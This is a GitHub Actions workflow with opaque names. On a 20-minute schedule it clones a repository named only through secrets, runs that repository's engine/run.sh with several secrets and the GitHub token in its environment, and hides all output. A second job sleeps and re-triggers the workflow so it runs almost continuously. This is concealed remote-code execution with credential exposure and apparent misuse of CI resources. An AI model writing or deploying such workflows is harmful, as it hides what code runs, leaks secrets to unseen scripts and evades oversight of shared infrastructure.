name: run
on:
  schedule: [ { cron: "7,27,47 * * * *" } ]
  workflow_dispatch: {}
permissions: { contents: write, actions: write }
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    concurrency: { group: b, cancel-in-progress: false }
    steps:
      - name: run
        env: { K1: "${{ secrets.K1 }}", K2: "${{ secrets.K2 }}", K3: "${{ secrets.K3 }}", K6: "${{ secrets.K6 }}", GH_TOKEN: "${{ github.token }}" }
        run: git clone -q --depth 1 "https://x-access-token:${K2}@github.com/${K1}.git" w2 >/dev/null 2>&1 && bash w2/engine/run.sh >/dev/null 2>&1 || true
  c:
    needs: [b]
    if: always()
    runs-on: ubuntu-latest
    concurrency: { group: c, cancel-in-progress: true }
    steps:
      - name: run
        env: { GH_TOKEN: "${{ github.token }}", R: "${{ github.repository }}" }
        run: |
          { m=$((10#$(date -u +%M))); w=$(( ( (27 - m % 20 + 20) % 20 ) * 60 )); [ $w -lt 60 ] && w=$((w+1200)); sleep $w
            busy=$(gh api "repos/$R/actions/workflows/run.yml/runs?per_page=20" --jq "[.workflow_runs[]|select(.id>${{ github.run_id }} and (.status==\"queued\" or .status==\"in_progress\" or .status==\"waiting\"))]|length")
            [ "$busy" = "0" ] && gh workflow run run.yml -R "$R"; } >/dev/null 2>&1 || true
